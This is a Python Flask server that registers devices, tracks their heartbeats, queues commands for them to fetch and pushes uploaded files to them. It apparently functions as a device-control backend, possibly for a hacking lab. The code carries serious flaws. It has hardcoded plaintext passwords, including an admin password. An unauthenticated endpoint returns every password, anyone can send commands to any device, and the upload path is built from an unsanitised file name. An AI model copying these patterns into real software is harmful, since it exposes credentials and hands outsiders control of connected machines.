from flask import Flask, request, jsonify
import hashlib
import uuid
import time

app = Flask(__name__)

# In-memory storage (replace with persistent storage in production)
devices = {}
commands = {}
passwords = {
    'user123': 'user',
    'Cyb37h4ck37': 'admin'
}

def hash_token(token):
    return hashlib.sha256(token.encode()).hexdigest()

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    device_id = data.get('device_id')
    device_name = data.get('device_name')
    owner_token = data.get('owner_token')

    if not all([device_id, device_name, owner_token]):
        return jsonify({'status': 'error', 'message': 'Missing fields'}), 400

    owner_id = hash_token(owner_token)
    devices[device_id] = {
        'device_name': device_name,
        'owner_id': owner_id,
        'last_heartbeat': time.time()
    }
    return jsonify({'status': 'success', 'message': 'Device registered'})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    device_id = data.get('device_id')

    if device_id in devices:
        devices[device_id]['last_heartbeat'] = time.time()
        return jsonify({'status': 'success', 'message': 'Heartbeat received'})
    else:
        return jsonify({'status': 'error', 'message': 'Device not found'}), 404

@app.route('/get_devices', methods=['POST'])
def get_devices():
    data = request.json
    owner_token = data.get('owner_token')
    if not owner_token:
        return jsonify({'status': 'error', 'message': 'Missing owner_token'}), 400

    owner_id = hash_token(owner_token)
    current_time = time.time()
    user_devices = [
        {
            'device_id': did,
            'device_name': info['device_name'],
            'status': 'online' if current_time - info.get('last_heartbeat', 0) < 60 else 'offline'
        }
        for did, info in devices.items()
        if info['owner_id'] == owner_id
    ]
    return jsonify({'status': 'success', 'devices': user_devices})

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')

    if device_id not in devices:
        return jsonify({'status': 'error', 'message': 'Device not found'}), 404

    commands[device_id] = command
    return jsonify({'status': 'success', 'message': 'Command sent'})

@app.route('/get_command', methods=['POST'])
def get_command():
    data = request.json
    device_id = data.get('device_id')

    command = commands.pop(device_id, None)
    if command:
        return jsonify({'status': 'success', 'command': command})
    else:
        return jsonify({'status': 'success', 'command': None})

@app.route('/get_passwords', methods=['GET'])
def get_passwords():
    return jsonify(passwords)

@app.route('/upload_file', methods=['POST'])
def upload_file():
    device_id = request.form.get('device_id')
    file = request.files.get('file')

    if not all([device_id, file]):
        return jsonify({'status': 'error', 'message': 'Missing fields'}), 400

    filename = f"{uuid.uuid4().hex}_{file.filename}"
    filepath = f"./uploads/{filename}"
    file.save(filepath)

    # Notify device to download the file
    commands[device_id] = {'action': 'download_file', 'file_path': filepath}
    return jsonify({'status': 'success', 'message': 'File uploaded'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
